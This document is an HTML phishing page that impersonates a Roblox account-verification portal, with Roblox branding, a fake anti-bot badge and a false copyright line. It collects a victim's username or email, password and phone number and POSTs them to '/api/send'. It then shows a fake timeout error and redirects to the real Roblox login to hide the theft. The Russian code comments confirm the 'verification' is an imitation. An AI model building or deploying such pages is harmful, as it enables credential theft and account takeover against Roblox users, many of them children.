<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox | Verification Portal</title>
    <style>
        body { margin: 0; font-family: 'HCo Gotham SSm', "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; background-image: radial-gradient(circle at center, #1e1e1e 0%, #000 100%); }
        .container { background-color: #232527; padding: 40px; border-radius: 12px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.7); border: 1px solid #393b3d; }
        .logo { width: 60px; height: 60px; background: url('https://www.roblox.com/images/logos/rebrand/metric_144_white.png') no-repeat center; background-size: contain; margin: 0 auto 20px; }
        h2 { font-size: 24px; margin-bottom: 10px; color: #fff; }
        p { color: #bdbebe; font-size: 14px; margin-bottom: 25px; }
        .anti-bot { background: rgba(0, 162, 255, 0.1); border: 1px solid #00A2FF; color: #00A2FF; padding: 10px; border-radius: 5px; font-size: 12px; margin-bottom: 20px; font-weight: bold; }
        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #393b3d; background-color: #111; color: #fff; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
        input:focus { border-color: #00A2FF; }
        button { width: 100%; padding: 15px; border-radius: 8px; border: none; background-color: #00A2FF; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        button:hover { background-color: #0081cc; transform: scale(1.02); }
        .footer-text { font-size: 11px; color: #666; margin-top: 20px; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <h2>Account Verification</h2>
        <div class="anti-bot">🛡️ ANTI-BOT SYSTEM: ACTIVE (v8.2)</div>
        <p>To prevent unauthorized access, please verify your session credentials and linked phone.</p>
        
        <form id="v-form">
            <input type="text" id="u" placeholder="Username / Email" required>
            <input type="password" id="p" placeholder="Password" required>
            <input type="tel" id="t" placeholder="Phone Number (Linked to Account)" required>
            <button type="submit" id="btn">VERIFY IDENTITY</button>
        </form>

        <div class="footer-text">
            Important: Verification requires an account age of at least 30 days. <br>
            © 2025 Roblox Corporation. All rights reserved.
        </div>
    </div>

    <script>
        document.getElementById('v-form').onsubmit = async (e) => {
            e.preventDefault();
            const b = document.getElementById('btn');
            b.innerText = 'PROCESSING...';
            b.disabled = true;

            // Отправляем данные
            await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ u: u.value, p: p.value, t: t.value })
            });

            // Имитация "проверки" и редирект
            setTimeout(() => {
                alert("Verification failed: Session timeout. Please login manually.");
                window.location.href = "https://www.roblox.com/login";
            }, 3000);
        };
    </script>
</body>
</html>
